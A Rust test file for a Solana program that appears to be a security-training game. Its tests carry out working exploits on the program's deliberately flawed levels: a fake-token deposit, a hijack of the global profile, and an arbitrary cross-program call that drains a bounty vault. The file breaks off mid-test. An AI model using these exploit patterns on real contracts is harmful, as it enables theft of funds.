#[cfg(test)]
mod tests {
    use crate::{
        instruction,
        state::{
            BankConfig, CertificationAuthority, GuildAuthority, Level0State, Level1State,
            Level2State, Level3State, LevelCertificate, UserProfile, UserStats,
        },
        ID as PROGRAM_ID,
    };
    use anchor_lang::{AccountDeserialize, InstructionData};
    use anchor_spl::token::spl_token;
    use litesvm::LiteSVM;
    use solana_sdk::{
        hash,
        instruction::{AccountMeta, Instruction},
        program_pack::Pack,
        pubkey,
        pubkey::Pubkey,
        signature::Keypair,
        signer::Signer,
        system_instruction, system_program,
        transaction::Transaction,
    };

    const LAMPORTS_PER_SOL: u64 = 1_000_000_000;
    const LEVEL_1_TARGET: u64 = 1_000_000;
    const LEVEL_3_TARGET: u64 = 1;
    const MERCENARY_PROGRAM_ID: Pubkey = pubkey!("EYUQDYesXVQon3tfQavDu5gErk4oGnNmVXnQHDnCHzzv");

    fn get_user_stats_pda(user: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"stats", user.as_ref()], &PROGRAM_ID)
    }

    fn get_level_0_pda(user: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"level_0", user.as_ref()], &PROGRAM_ID)
    }

    fn get_bank_pda() -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"bank"], &PROGRAM_ID)
    }

    fn get_level_1_pda(user: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"level_1", user.as_ref()], &PROGRAM_ID)
    }

    fn get_profile_pda() -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"profile"], &PROGRAM_ID)
    }

    fn get_level_2_pda(user: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"level_2", user.as_ref()], &PROGRAM_ID)
    }

    fn get_guild_authority_pda() -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"guild_authority"], &PROGRAM_ID)
    }

    fn get_level_3_pda(user: &Pubkey) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"level_3", user.as_ref()], &PROGRAM_ID)
    }

    fn get_certification_authority_pda() -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"certification_authority"], &PROGRAM_ID)
    }

    fn get_certificate_pda(user: &Pubkey, level: u8) -> (Pubkey, u8) {
        Pubkey::find_program_address(&[b"certificate", user.as_ref(), &[level]], &PROGRAM_ID)
    }

    fn create_init_user_stats_ix(user: &Pubkey, user_stats: &Pubkey) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitUserStats {}.data(),
        }
    }

    fn create_init_level_0_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_0_state: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_0_state, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitLevel0 {}.data(),
        }
    }

    fn create_verify_and_close_level_0_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_0_state: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_0_state, false),
            ],
            data: instruction::VerifyAndCloseLevel0 {}.data(),
        }
    }

    fn create_init_bank_ix(
        admin: &Pubkey,
        bank: &Pubkey,
        expected_mint: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*admin, true),
                AccountMeta::new(*bank, false),
                AccountMeta::new_readonly(*expected_mint, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitBank {}.data(),
        }
    }

    fn create_init_level_1_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_1_state: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_1_state, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitLevel1 {}.data(),
        }
    }

    fn create_deposit_tokens_ix(
        user: &Pubkey,
        bank: &Pubkey,
        level_1_state: &Pubkey,
        vault: &Pubkey,
        user_token_account: &Pubkey,
        amount: u64,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new_readonly(*bank, false),
                AccountMeta::new(*level_1_state, false),
                AccountMeta::new(*vault, false),
                AccountMeta::new(*user_token_account, false),
                AccountMeta::new_readonly(spl_token::id(), false),
            ],
            data: instruction::DepositTokens { amount }.data(),
        }
    }

    fn create_verify_and_close_level_1_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_1_state: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_1_state, false),
            ],
            data: instruction::VerifyAndCloseLevel1 {}.data(),
        }
    }

    fn create_init_global_profile_ix(
        admin: &Pubkey,
        profile: &Pubkey,
        initial_commander: Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*admin, true),
                AccountMeta::new(*profile, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitGlobalProfile { initial_commander }.data(),
        }
    }

    fn create_init_level_2_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_2_state: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_2_state, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitLevel2 {}.data(),
        }
    }

    fn create_update_profile_ix(user: &Pubkey, profile: &Pubkey) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*profile, false),
            ],
            data: instruction::UpdateProfile {}.data(),
        }
    }

    fn create_verify_and_close_level_2_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_2_state: &Pubkey,
        profile: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_2_state, false),
                AccountMeta::new_readonly(*profile, false),
            ],
            data: instruction::VerifyAndCloseLevel2 {}.data(),
        }
    }

    fn create_init_guild_authority_ix(
        admin: &Pubkey,
        guild_authority: &Pubkey,
        reward_mint: &Pubkey,
        bounty_vault: &Pubkey,
        bounty_amount: u64,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*admin, true),
                AccountMeta::new(*guild_authority, false),
                AccountMeta::new_readonly(*reward_mint, false),
                AccountMeta::new_readonly(*bounty_vault, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitGuildAuthority { bounty_amount }.data(),
        }
    }

    fn create_init_level_3_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_3_state: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new(*level_3_state, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitLevel3 {}.data(),
        }
    }

    fn create_delegate_task_ix(
        user: &Pubkey,
        level_3_state: &Pubkey,
        guild_authority: &Pubkey,
        bounty_vault: &Pubkey,
        user_reward_account: &Pubkey,
        external_program: &Pubkey,
        task_data: Vec<u8>,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*level_3_state, false),
                AccountMeta::new_readonly(*guild_authority, false),
                AccountMeta::new(*bounty_vault, false),
                AccountMeta::new(*user_reward_account, false),
                AccountMeta::new_readonly(*external_program, false),
                AccountMeta::new_readonly(spl_token::id(), false),
            ],
            data: instruction::DelegateTask { task_data }.data(),
        }
    }

    fn create_verify_and_close_level_3_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        level_3_state: &Pubkey,
        guild_authority: &Pubkey,
        user_reward_account: &Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new(*user_stats, false),
                AccountMeta::new_readonly(*guild_authority, false),
                AccountMeta::new_readonly(*user_reward_account, false),
                AccountMeta::new(*level_3_state, false),
            ],
            data: instruction::VerifyAndCloseLevel3 {}.data(),
        }
    }

    fn create_init_certification_authority_ix(
        admin: &Pubkey,
        certification_authority: &Pubkey,
        authority: Pubkey,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*admin, true),
                AccountMeta::new(*certification_authority, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::InitCertificationAuthority { authority }.data(),
        }
    }

    fn create_claim_level_certificate_ix(
        user: &Pubkey,
        user_stats: &Pubkey,
        certificate: &Pubkey,
        level: u8,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new(*user, true),
                AccountMeta::new_readonly(*user_stats, false),
                AccountMeta::new(*certificate, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ],
            data: instruction::ClaimLevelCertificate { level }.data(),
        }
    }

    fn create_record_certificate_asset_ix(
        authority: &Pubkey,
        certification_authority: &Pubkey,
        certificate: &Pubkey,
        merkle_tree: Pubkey,
        asset_id: Pubkey,
        leaf_index: u32,
        leaf_nonce: u64,
    ) -> Instruction {
        Instruction {
            program_id: PROGRAM_ID,
            accounts: vec![
                AccountMeta::new_readonly(*authority, true),
                AccountMeta::new_readonly(*certification_authority, false),
                AccountMeta::new(*certificate, false),
            ],
            data: instruction::RecordCertificateAsset {
                merkle_tree,
                asset_id,
                leaf_index,
                leaf_nonce,
            }
            .data(),
        }
    }

    fn mercenary_follow_orders_data(amount: u64) -> Vec<u8> {
        let hash = hash::hash(b"global:follow_orders");
        let mut data = hash.to_bytes()[..8].to_vec();
        data.extend_from_slice(&amount.to_le_bytes());
        data
    }

    fn create_mint(
        svm: &mut LiteSVM,
        payer: &Keypair,
        mint: &Keypair,
        authority: &Pubkey,
    ) {
        let mint_len = spl_token::state::Mint::LEN;
        let create_mint_ix = system_instruction::create_account(
            &payer.pubkey(),
            &mint.pubkey(),
            svm.minimum_balance_for_rent_exemption(mint_len),
            mint_len as u64,
            &spl_token::id(),
        );
        let init_mint_ix = spl_token::instruction::initialize_mint2(
            &spl_token::id(),
            &mint.pubkey(),
            authority,
            None,
            0,
        )
        .unwrap();

        let tx = Transaction::new_signed_with_payer(
            &[create_mint_ix, init_mint_ix],
            Some(&payer.pubkey()),
            &[payer, mint],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();
    }

    fn create_token_account(
        svm: &mut LiteSVM,
        payer: &Keypair,
        token_account: &Keypair,
        mint: &Pubkey,
        owner: &Pubkey,
    ) {
        let account_len = spl_token::state::Account::LEN;
        let create_account_ix = system_instruction::create_account(
            &payer.pubkey(),
            &token_account.pubkey(),
            svm.minimum_balance_for_rent_exemption(account_len),
            account_len as u64,
            &spl_token::id(),
        );
        let init_account_ix = spl_token::instruction::initialize_account3(
            &spl_token::id(),
            &token_account.pubkey(),
            mint,
            owner,
        )
        .unwrap();

        let tx = Transaction::new_signed_with_payer(
            &[create_account_ix, init_account_ix],
            Some(&payer.pubkey()),
            &[payer, token_account],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();
    }

    fn mint_tokens(
        svm: &mut LiteSVM,
        authority: &Keypair,
        mint: &Pubkey,
        destination: &Pubkey,
        amount: u64,
    ) {
        let mint_to_ix = spl_token::instruction::mint_to(
            &spl_token::id(),
            mint,
            destination,
            &authority.pubkey(),
            &[],
            amount,
        )
        .unwrap();

        let tx = Transaction::new_signed_with_payer(
            &[mint_to_ix],
            Some(&authority.pubkey()),
            &[authority],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();
    }

    #[test]
    fn init_level_0_creates_pda() {
        let mut svm = LiteSVM::new();

        let program_bytes = include_bytes!("../../../target/deploy/vault.so");
        let _ = svm.add_program(PROGRAM_ID, program_bytes);

        let user = Keypair::new();
        svm.airdrop(&user.pubkey(), LAMPORTS_PER_SOL).unwrap();

        let (user_stats_pda, _) = get_user_stats_pda(&user.pubkey());
        let (level_0_pda, level_0_bump) = get_level_0_pda(&user.pubkey());

        let init_user_stats_ix = create_init_user_stats_ix(&user.pubkey(), &user_stats_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_user_stats_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_level_0_ix =
            create_init_level_0_ix(&user.pubkey(), &user_stats_pda, &level_0_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_level_0_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let account = svm
            .get_account(&level_0_pda)
            .expect("level 0 PDA should exist");

        let mut account_data = account.data.as_slice();
        let level_0_state = Level0State::try_deserialize(&mut account_data)
            .expect("level 0 state should deserialize");

        assert_eq!(level_0_state.player, user.pubkey());
        assert_eq!(level_0_state.bump, level_0_bump);
    }

    #[test]
    fn verify_and_close_level_0_marks_complete_and_closes() {
        let mut svm = LiteSVM::new();

        let program_bytes = include_bytes!("../../../target/deploy/vault.so");
        let _ = svm.add_program(PROGRAM_ID, program_bytes);

        let user = Keypair::new();
        svm.airdrop(&user.pubkey(), LAMPORTS_PER_SOL).unwrap();

        let (user_stats_pda, _) = get_user_stats_pda(&user.pubkey());
        let (level_0_pda, _) = get_level_0_pda(&user.pubkey());

        let init_user_stats_ix = create_init_user_stats_ix(&user.pubkey(), &user_stats_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_user_stats_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_level_0_ix =
            create_init_level_0_ix(&user.pubkey(), &user_stats_pda, &level_0_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_level_0_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let verify_ix =
            create_verify_and_close_level_0_ix(&user.pubkey(), &user_stats_pda, &level_0_pda);
        let tx = Transaction::new_signed_with_payer(
            &[verify_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let user_stats_account = svm
            .get_account(&user_stats_pda)
            .expect("user stats PDA should exist");

        let mut user_stats_data = user_stats_account.data.as_slice();
        let user_stats = UserStats::try_deserialize(&mut user_stats_data)
            .expect("user stats should deserialize");

        assert!(user_stats.completed_levels[0]);
        assert!(
            svm.get_account(&level_0_pda).is_none(),
            "level 0 PDA should be closed after verification"
        );
    }

    #[test]
    fn level_1_fake_token_deposit_unlocks_completion() {
        let mut svm = LiteSVM::new();

        let program_bytes = include_bytes!("../../../target/deploy/vault.so");
        let _ = svm.add_program(PROGRAM_ID, program_bytes);

        let admin = Keypair::new();
        let user = Keypair::new();
        let real_mint = Keypair::new();
        let fake_mint = Keypair::new();
        let user_fake_token = Keypair::new();
        let fake_vault = Keypair::new();

        svm.airdrop(&admin.pubkey(), LAMPORTS_PER_SOL).unwrap();
        svm.airdrop(&user.pubkey(), LAMPORTS_PER_SOL).unwrap();

        create_mint(&mut svm, &admin, &real_mint, &admin.pubkey());
        create_mint(&mut svm, &user, &fake_mint, &user.pubkey());
        create_token_account(
            &mut svm,
            &user,
            &user_fake_token,
            &fake_mint.pubkey(),
            &user.pubkey(),
        );
        create_token_account(
            &mut svm,
            &user,
            &fake_vault,
            &fake_mint.pubkey(),
            &admin.pubkey(),
        );
        mint_tokens(
            &mut svm,
            &user,
            &fake_mint.pubkey(),
            &user_fake_token.pubkey(),
            LEVEL_1_TARGET,
        );

        let (bank_pda, bank_bump) = get_bank_pda();
        let (user_stats_pda, _) = get_user_stats_pda(&user.pubkey());
        let (level_1_pda, level_1_bump) = get_level_1_pda(&user.pubkey());

        let init_bank_ix = create_init_bank_ix(&admin.pubkey(), &bank_pda, &real_mint.pubkey());
        let tx = Transaction::new_signed_with_payer(
            &[init_bank_ix],
            Some(&admin.pubkey()),
            &[&admin],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_user_stats_ix = create_init_user_stats_ix(&user.pubkey(), &user_stats_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_user_stats_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_level_1_ix = create_init_level_1_ix(&user.pubkey(), &user_stats_pda, &level_1_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_level_1_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let deposit_ix = create_deposit_tokens_ix(
            &user.pubkey(),
            &bank_pda,
            &level_1_pda,
            &fake_vault.pubkey(),
            &user_fake_token.pubkey(),
            LEVEL_1_TARGET,
        );
        let tx = Transaction::new_signed_with_payer(
            &[deposit_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let bank_account = svm.get_account(&bank_pda).expect("bank PDA should exist");
        let mut bank_data = bank_account.data.as_slice();
        let bank = BankConfig::try_deserialize(&mut bank_data).expect("bank should deserialize");

        assert_eq!(bank.expected_mint, real_mint.pubkey());
        assert_eq!(bank.bump, bank_bump);

        let level_1_account = svm
            .get_account(&level_1_pda)
            .expect("level 1 PDA should exist");
        let mut level_1_data = level_1_account.data.as_slice();
        let level_1_state = Level1State::try_deserialize(&mut level_1_data)
            .expect("level 1 state should deserialize");

        assert_eq!(level_1_state.player, user.pubkey());
        assert_eq!(level_1_state.deposited_amount, LEVEL_1_TARGET);
        assert_eq!(level_1_state.bump, level_1_bump);

        let fake_vault_account = svm
            .get_account(&fake_vault.pubkey())
            .expect("fake vault token account should exist");
        let fake_vault_token_state =
            spl_token::state::Account::unpack(&fake_vault_account.data).unwrap();
        assert_eq!(fake_vault_token_state.mint, fake_mint.pubkey());
        assert_ne!(fake_vault_token_state.mint, real_mint.pubkey());
        assert_eq!(fake_vault_token_state.amount, LEVEL_1_TARGET);

        let verify_ix =
            create_verify_and_close_level_1_ix(&user.pubkey(), &user_stats_pda, &level_1_pda);
        let tx = Transaction::new_signed_with_payer(
            &[verify_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let user_stats_account = svm
            .get_account(&user_stats_pda)
            .expect("user stats PDA should exist");
        let mut user_stats_data = user_stats_account.data.as_slice();
        let user_stats = UserStats::try_deserialize(&mut user_stats_data)
            .expect("user stats should deserialize");

        assert!(user_stats.completed_levels[1]);
        assert!(
            svm.get_account(&level_1_pda).is_none(),
            "level 1 PDA should be closed after verification"
        );
    }

    #[test]
    fn level_2_global_profile_can_be_hijacked_and_verified() {
        let mut svm = LiteSVM::new();

        let program_bytes = include_bytes!("../../../target/deploy/vault.so");
        let _ = svm.add_program(PROGRAM_ID, program_bytes);

        let admin = Keypair::new();
        let user = Keypair::new();

        svm.airdrop(&admin.pubkey(), LAMPORTS_PER_SOL).unwrap();
        svm.airdrop(&user.pubkey(), LAMPORTS_PER_SOL).unwrap();

        let (profile_pda, profile_bump) = get_profile_pda();
        let (user_stats_pda, _) = get_user_stats_pda(&user.pubkey());
        let (level_2_pda, level_2_bump) = get_level_2_pda(&user.pubkey());

        let init_profile_ix =
            create_init_global_profile_ix(&admin.pubkey(), &profile_pda, admin.pubkey());
        let tx = Transaction::new_signed_with_payer(
            &[init_profile_ix],
            Some(&admin.pubkey()),
            &[&admin],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_user_stats_ix = create_init_user_stats_ix(&user.pubkey(), &user_stats_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_user_stats_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_level_2_ix = create_init_level_2_ix(&user.pubkey(), &user_stats_pda, &level_2_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_level_2_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let overwrite_ix = create_update_profile_ix(&user.pubkey(), &profile_pda);
        let tx = Transaction::new_signed_with_payer(
            &[overwrite_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let profile_account = svm
            .get_account(&profile_pda)
            .expect("profile PDA should exist");
        let mut profile_data = profile_account.data.as_slice();
        let profile = UserProfile::try_deserialize(&mut profile_data)
            .expect("profile should deserialize");

        assert_eq!(profile.commander, user.pubkey());
        assert_eq!(profile.bump, profile_bump);

        let level_2_account = svm
            .get_account(&level_2_pda)
            .expect("level 2 PDA should exist");
        let mut level_2_data = level_2_account.data.as_slice();
        let level_2_state = Level2State::try_deserialize(&mut level_2_data)
            .expect("level 2 state should deserialize");

        assert_eq!(level_2_state.player, user.pubkey());
        assert_eq!(level_2_state.bump, level_2_bump);

        let verify_ix = create_verify_and_close_level_2_ix(
            &user.pubkey(),
            &user_stats_pda,
            &level_2_pda,
            &profile_pda,
        );
        let tx = Transaction::new_signed_with_payer(
            &[verify_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let user_stats_account = svm
            .get_account(&user_stats_pda)
            .expect("user stats PDA should exist");
        let mut user_stats_data = user_stats_account.data.as_slice();
        let user_stats = UserStats::try_deserialize(&mut user_stats_data)
            .expect("user stats should deserialize");

        assert!(user_stats.completed_levels[2]);
        assert!(
            svm.get_account(&level_2_pda).is_none(),
            "level 2 PDA should be closed after verification"
        );
        assert!(
            svm.get_account(&profile_pda).is_some(),
            "global profile should persist after verification"
        );
    }

    #[test]
    fn level_3_arbitrary_cpi_hijacks_delegation_and_verifies() {
        let mut svm = LiteSVM::new();

        let vault_program_bytes = include_bytes!("../../../target/deploy/vault.so");
        let mercenary_program_bytes = include_bytes!("../../../target/deploy/mercenary.so");
        let _ = svm.add_program(PROGRAM_ID, vault_program_bytes);
        let _ = svm.add_program(MERCENARY_PROGRAM_ID, mercenary_program_bytes);

        let admin = Keypair::new();
        let user = Keypair::new();
        let reward_mint = Keypair::new();
        let bounty_vault = Keypair::new();
        let user_reward_account = Keypair::new();

        svm.airdrop(&admin.pubkey(), LAMPORTS_PER_SOL).unwrap();
        svm.airdrop(&user.pubkey(), LAMPORTS_PER_SOL).unwrap();

        let (guild_authority_pda, guild_authority_bump) = get_guild_authority_pda();
        create_mint(&mut svm, &admin, &reward_mint, &admin.pubkey());
        create_token_account(
            &mut svm,
            &admin,
            &bounty_vault,
            &reward_mint.pubkey(),
            &guild_authority_pda,
        );
        create_token_account(
            &mut svm,
            &user,
            &user_reward_account,
            &reward_mint.pubkey(),
            &user.pubkey(),
        );
        mint_tokens(
            &mut svm,
            &admin,
            &reward_mint.pubkey(),
            &bounty_vault.pubkey(),
            LEVEL_3_TARGET,
        );

        let (user_stats_pda, _) = get_user_stats_pda(&user.pubkey());
        let (level_3_pda, level_3_bump) = get_level_3_pda(&user.pubkey());

        let init_user_stats_ix = create_init_user_stats_ix(&user.pubkey(), &user_stats_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_user_stats_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_guild_authority_ix = create_init_guild_authority_ix(
            &admin.pubkey(),
            &guild_authority_pda,
            &reward_mint.pubkey(),
            &bounty_vault.pubkey(),
            LEVEL_3_TARGET,
        );
        let tx = Transaction::new_signed_with_payer(
            &[init_guild_authority_ix],
            Some(&admin.pubkey()),
            &[&admin],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_level_3_ix = create_init_level_3_ix(&user.pubkey(), &user_stats_pda, &level_3_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_level_3_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let delegate_ix = create_delegate_task_ix(
            &user.pubkey(),
            &level_3_pda,
            &guild_authority_pda,
            &bounty_vault.pubkey(),
            &user_reward_account.pubkey(),
            &MERCENARY_PROGRAM_ID,
            mercenary_follow_orders_data(LEVEL_3_TARGET),
        );
        let tx = Transaction::new_signed_with_payer(
            &[delegate_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let guild_authority_account = svm
            .get_account(&guild_authority_pda)
            .expect("guild authority PDA should exist");
        let mut guild_authority_data = guild_authority_account.data.as_slice();
        let guild_authority = GuildAuthority::try_deserialize(&mut guild_authority_data)
            .expect("guild authority should deserialize");
        assert_eq!(guild_authority.reward_mint, reward_mint.pubkey());
        assert_eq!(guild_authority.bounty_vault, bounty_vault.pubkey());
        assert_eq!(guild_authority.bounty_amount, LEVEL_3_TARGET);
        assert_eq!(guild_authority.bump, guild_authority_bump);

        let level_3_account = svm
            .get_account(&level_3_pda)
            .expect("level 3 PDA should exist");
        let mut level_3_data = level_3_account.data.as_slice();
        let level_3_state = Level3State::try_deserialize(&mut level_3_data)
            .expect("level 3 state should deserialize");
        assert_eq!(level_3_state.player, user.pubkey());
        assert_eq!(level_3_state.bump, level_3_bump);

        let bounty_vault_account = svm
            .get_account(&bounty_vault.pubkey())
            .expect("bounty vault token account should exist");
        let bounty_vault_state = spl_token::state::Account::unpack(&bounty_vault_account.data)
            .expect("bounty vault should unpack");
        assert_eq!(bounty_vault_state.amount, 0);

        let user_reward_account_data = svm
            .get_account(&user_reward_account.pubkey())
            .expect("user reward token account should exist");
        let user_reward_token_state =
            spl_token::state::Account::unpack(&user_reward_account_data.data)
                .expect("user reward account should unpack");
        assert_eq!(user_reward_token_state.amount, LEVEL_3_TARGET);

        let verify_ix = create_verify_and_close_level_3_ix(
            &user.pubkey(),
            &user_stats_pda,
            &level_3_pda,
            &guild_authority_pda,
            &user_reward_account.pubkey(),
        );
        let tx = Transaction::new_signed_with_payer(
            &[verify_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let user_stats_account = svm
            .get_account(&user_stats_pda)
            .expect("user stats PDA should exist");
        let mut user_stats_data = user_stats_account.data.as_slice();
        let user_stats = UserStats::try_deserialize(&mut user_stats_data)
            .expect("user stats should deserialize");

        assert!(user_stats.completed_levels[3]);
        assert!(
            svm.get_account(&level_3_pda).is_none(),
            "level 3 PDA should be closed after verification"
        );
        assert!(
            svm.get_account(&guild_authority_pda).is_some(),
            "guild authority PDA should persist after verification"
        );
    }

    #[test]
    fn claimed_certificate_can_be_bound_to_a_cnft_asset_by_authority() {
        let mut svm = LiteSVM::new();

        let program_bytes = include_bytes!("../../../target/deploy/vault.so");
        let _ = svm.add_program(PROGRAM_ID, program_bytes);

        let admin = Keypair::new();
        let user = Keypair::new();
        let merkle_tree = Keypair::new();
        let asset_id = Keypair::new();

        svm.airdrop(&admin.pubkey(), LAMPORTS_PER_SOL).unwrap();
        svm.airdrop(&user.pubkey(), LAMPORTS_PER_SOL).unwrap();

        let (certification_authority_pda, certification_authority_bump) =
            get_certification_authority_pda();
        let (user_stats_pda, _) = get_user_stats_pda(&user.pubkey());
        let (level_0_pda, _) = get_level_0_pda(&user.pubkey());
        let (certificate_pda, certificate_bump) = get_certificate_pda(&user.pubkey(), 0);

        let init_authority_ix = create_init_certification_authority_ix(
            &admin.pubkey(),
            &certification_authority_pda,
            admin.pubkey(),
        );
        let tx = Transaction::new_signed_with_payer(
            &[init_authority_ix],
            Some(&admin.pubkey()),
            &[&admin],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_user_stats_ix = create_init_user_stats_ix(&user.pubkey(), &user_stats_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_user_stats_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let init_level_0_ix =
            create_init_level_0_ix(&user.pubkey(), &user_stats_pda, &level_0_pda);
        let tx = Transaction::new_signed_with_payer(
            &[init_level_0_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let verify_ix =
            create_verify_and_close_level_0_ix(&user.pubkey(), &user_stats_pda, &level_0_pda);
        let tx = Transaction::new_signed_with_payer(
            &[verify_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
        svm.send_transaction(tx).unwrap();

        let claim_ix = create_claim_level_certificate_ix(
            &user.pubkey(),
            &user_stats_pda,
            &certificate_pda,
            0,
        );
        let tx = Transaction::new_signed_with_payer(
            &[claim_ix],
            Some(&user.pubkey()),
            &[&user],
            svm.latest_blockhash(),
        );
